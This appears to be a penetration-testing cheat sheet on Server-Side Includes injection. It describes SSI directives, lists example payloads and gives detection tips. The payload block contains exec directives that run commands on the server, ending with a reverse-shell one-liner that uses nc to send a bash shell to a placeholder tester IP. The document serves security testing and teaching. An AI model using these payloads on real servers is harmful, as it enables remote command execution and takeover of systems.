## Primary SSI directives 

- **config** : The config command is a control directive to modify various SSI components. Includes parameters such as the default server error message (errmsg), file size format (sizefmt), and the date & time format (timefmt)

- **echo** : Inserts SSI and CGI environment variables values while including optional encoding arguments.

- **exec** : Executes an external application, following which the execution output is inserted into the document. This control directive supports cmd arguments from any client app or a cgi program.

- **flastmod**: The last time and date a specified file was modified. It accepts both a virtual path (virtual) and a relative pathname (file) as arguments for locating the document on the server.

- **include**:  Inserts text from another document into the current file. It also accepts file and virtual arguments to locate the document.

```
virtual uses a path that's relative to the server's document root or current directory and is processed by the server to determine the actual file location.
file uses the actual file path (relative or absolute) on the server's file system.
```

- **printenv**  Displays all environment variables within the server.

- **set** : A control directive that sets a server-side variable to the specified value.



## Payloads 

``` 
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->

// reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```


## Detection 

- checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.

- It is possible to check if the application is properly validating input fields data by inserting characters that are used in SSI directives, like:
< ! # = / . " - > and [a-zA-Z0-9]
